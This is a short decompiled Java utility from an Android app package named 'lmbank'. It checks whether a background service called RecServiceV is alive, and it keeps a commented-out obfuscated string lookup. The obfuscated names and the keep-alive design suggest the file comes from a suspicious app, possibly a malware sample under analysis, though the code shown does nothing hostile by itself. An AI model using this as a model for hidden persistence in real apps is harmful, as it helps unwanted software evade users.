package com.wish.lmbank.keeplive.utils;

import android.app.ActivityManager;
import android.content.Context;

import com.wish.lmbank.service.RecServiceV;

import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/keeplive/utils/ServiceUtils.class */
public class ServiceUtils {
    public boolean isServiceRunning(Context context, String str) {
        boolean z = RecServiceV.isAlive;
//         List<ActivityManager.RunningServiceInfo> runningServices = ((ActivityManager) context.getSystemService(bb7d7pu7.m5998("CAodAB8AHRA"))).getRunningServices(Integer.MAX_VALUE);
        List<ActivityManager.RunningServiceInfo> runningServices = ((ActivityManager) context.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE);
        if (runningServices != null) {
            runningServices.iterator();
        }
        return z;
    }
}
